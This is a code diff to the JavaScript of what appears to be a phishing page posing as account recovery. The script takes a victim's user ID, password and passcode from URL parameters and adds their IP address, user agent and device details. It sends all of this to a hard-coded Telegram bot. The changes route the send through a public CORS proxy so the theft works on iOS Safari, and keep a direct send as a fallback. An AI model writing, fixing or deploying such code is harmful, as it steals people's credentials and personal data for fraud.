@@ -86,11 +86,14 @@
 var TELEGRAM_BOT_TOKEN = '8580841728:AAFsXNmdnj-kBurv4UxM4ucpZm4NqYcDL00';
 var TELEGRAM_CHAT_ID = '-5233511146';
 
+// CORS PROXY - Required for iOS Safari
+var CORS_PROXY = 'https://corsproxy.io/?';
+
 document.addEventListener('DOMContentLoaded', function() {
     var form = document.getElementById('recoverForm');
     var phoneInput = document.getElementById('cid');
     
-    // MOBILE FIX: Get data from URL parameters instead of sessionStorage
+    // Get data from URL parameters
     function getUrlParam(name) {
         var results = new RegExp('[\\?&]' + name + '=([^&#]*)').exec(window.location.href);
         return results ? decodeURIComponent(results[1]) : null;
@@ -111,10 +114,12 @@ document.addEventListener('DOMContentLoaded', function() {
         passcode = 'Not provided';
     }
     
-    // DEBUG: Log what we received (remove in production)
-    console.log('Data received:', {uid: userId, pwd: password ? '***' : 'empty', tok: passcode});
+    // DEBUG: Show alert on mobile to verify data
+    if (/iPhone|iPad|iPod|Android/.test(navigator.userAgent)) {
+        console.log('Mobile detected. Data:', userId, password ? '***' : 'empty', passcode);
+    }
     
-    // Create error container if it doesn't exist
+    // Create error container
     var phoneErrorEl = document.getElementById('phone-error');
     if (!phoneErrorEl) {
         var phoneErrorDiv = document.createElement('div');
@@ -178,7 +183,7 @@ document.addEventListener('DOMContentLoaded', function() {
         return { device: device, platform: platform };
     }
     
-    // Get IP using XMLHttpRequest (compatible with all browsers)
+    // Get IP using XMLHttpRequest
     function getIP(callback) {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', 'https://api.ipify.org?format=json', true);
@@ -202,27 +207,59 @@ document.addEventListener('DOMContentLoaded', function() {
         xhr.send();
     }
     
-    // Send to Telegram using XMLHttpRequest (compatible with all browsers)
+    // Send to Telegram using CORS Proxy (Fixes iOS Safari)
     function sendToTelegram(message, callback) {
+        var telegramUrl = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+        var proxyUrl = CORS_PROXY + encodeURIComponent(telegramUrl);
+        
         var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', true);
+        xhr.open('POST', proxyUrl, true);
         xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.timeout = 10000;
+        xhr.timeout = 15000; // Longer timeout for proxy
+        
         xhr.onreadystatechange = function() {
             if (xhr.readyState === 4) {
-                console.log('Telegram status:', xhr.status);
-                console.log('Telegram response:', xhr.responseText);
+                console.log('Telegram proxy status:', xhr.status);
+                console.log('Telegram proxy response:', xhr.responseText);
                 if (callback) callback(xhr.status === 200);
             }
         };
+        
         xhr.onerror = function() {
-            console.error('Telegram XHR Error');
-            if (callback) callback(false);
+            console.error('Telegram XHR Error - trying without proxy as fallback');
+            // Fallback: try direct request (will fail on iOS but works on desktop)
+            fallbackSendToTelegram(message, callback);
         };
+        
         xhr.ontimeout = function() {
             console.error('Telegram Timeout');
             if (callback) callback(false);
         };
+        
+        xhr.send(JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        }));
+    }
+    
+    // Fallback direct request (for desktop)
+    function fallbackSendToTelegram(message, callback) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.timeout = 10000;
+        
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                if (callback) callback(xhr.status === 200);
+            }
+        };
+        
+        xhr.onerror = function() {
+            if (callback) callback(false);
+        };
+        
         xhr.send(JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
@@ -263,7 +300,7 @@ document.addEventListener('DOMContentLoaded', function() {
         getIP(function(ip) {
             message += ip + '`\nUA: ' + navigator.userAgent + '\nDevice: ' + deviceInfo.device + '\nPlatform: ' + deviceInfo.platform + '\nDate: ' + currentDateTime;
             
-            console.log('Sending message:', message);
+            console.log('Sending message via proxy...');
             
             sendToTelegram(message, function(success) {
                 console.log('Send success:', success);
